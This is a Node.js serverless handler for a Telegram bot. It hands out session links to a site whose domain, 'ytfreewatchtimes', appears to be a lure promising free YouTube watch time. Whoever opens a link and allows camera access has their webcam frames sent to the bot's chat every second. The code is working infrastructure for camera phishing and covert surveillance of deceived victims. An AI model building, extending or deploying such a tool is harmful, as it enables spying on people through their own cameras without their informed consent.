module.exports = async function handler(req, res) {
  const token   = process.env.TG_BOT_TOKEN;
  const siteUrl = process.env.SITE_URL || 'https://ytfreewatchtimes.vercel.app';
  if (!token) return res.status(200).json({ ok: true });

  const update = req.body || {};
  const tg = (method, payload) =>
    fetch(`https://api.telegram.org/bot${token}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

  // /start  → welcome + inline keyboard
  const msg = update.message;
  if (msg && (msg.text || '').startsWith('/start')) {
    await tg('sendMessage', {
      chat_id: msg.chat.id,
      text:
        '👋 <b>Welcome</b>\n\n' +
        'Camera capture ready.\n' +
        'Tap the button below to receive your session link.',
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [[
          { text: '📷 Start Camera Session', callback_data: 'cam_start' }
        ]]
      }
    });
    return res.status(200).json({ ok: true });
  }

  // button click  → issue URL with chat_id
  const cb = update.callback_query;
  if (cb) {
    const chatId = cb.message.chat.id;
    await tg('answerCallbackQuery', { callback_query_id: cb.id });

    if (cb.data === 'cam_start') {
      const url = `${siteUrl}/cam?chatid=${chatId}`;
      await tg('sendMessage', {
        chat_id: chatId,
        text:
          `🔗 <b>Your session link</b>\n\n` +
          `<code>${url}</code>\n\n` +
          `Open the link, allow camera, frames will arrive here every 1s.`,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [[{ text: '📷 Open Camera', url }]]
        }
      });
    }
    return res.status(200).json({ ok: true });
  }

  return res.status(200).json({ ok: true });
};
